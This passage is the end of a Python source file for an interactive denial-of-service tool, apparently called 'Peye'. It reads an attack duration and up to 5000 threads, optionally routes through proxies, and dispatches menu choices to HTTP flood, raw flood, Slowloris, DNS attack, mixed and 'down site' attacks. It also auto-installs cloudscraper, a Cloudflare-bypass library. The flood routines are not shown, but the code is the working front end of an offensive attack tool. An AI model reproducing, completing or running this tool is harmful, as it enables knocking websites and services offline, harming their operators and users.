                dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
                dos = DoSAttack(target, self.use_proxy)
                
                attack_map = {
                    '12': dos.http_flood, '13': dos.raw_flood, '14': dos.slowloris,
                    '15': dos.dns_attack, '16': dos.mixed_flood, '17': dos.all_attacks,
                    '18': dos.down_site
                }
                if choice in attack_map:
                    attack_map[choice](dur, min(thr, 5000))
            
            input(f"\n{YELLOW}Enter{RESET}")
            os.system('clear')
            print_banner()

if __name__ == "__main__":
    try:
        import cloudscraper
    except:
        os.system('pip install cloudscraper')
    peye = Peye()
    peye.run()
